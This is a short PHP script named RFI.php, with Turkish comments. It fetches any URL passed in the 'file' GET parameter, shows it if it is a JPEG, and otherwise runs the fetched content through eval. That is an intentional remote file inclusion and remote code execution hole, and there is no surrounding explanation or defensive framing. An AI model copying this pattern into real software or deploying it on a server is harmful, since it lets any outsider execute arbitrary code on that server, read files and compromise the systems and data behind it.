<?php
// RFI.php

// Uzak dosyanın URL'si
$dosya_url = $_GET['file'];

// Dosyanın uzantısını al
$dosya_uzanti = pathinfo($dosya_url, PATHINFO_EXTENSION);

// URL'den dosya içeriğini al
$dosya_icerik = file_get_contents($dosya_url);

if ($dosya_uzanti === 'jpg' || $dosya_uzanti === 'jpeg') {
    // Eğer dosya uzantısı JPEG ise, doğrudan resmi göster
    header('Content-Type: image/jpeg');
    echo $dosya_icerik;
} else {
    // Diğer durumlarda dosyayı çalıştır
    eval("?>$dosya_icerik<?php ");
}
?>
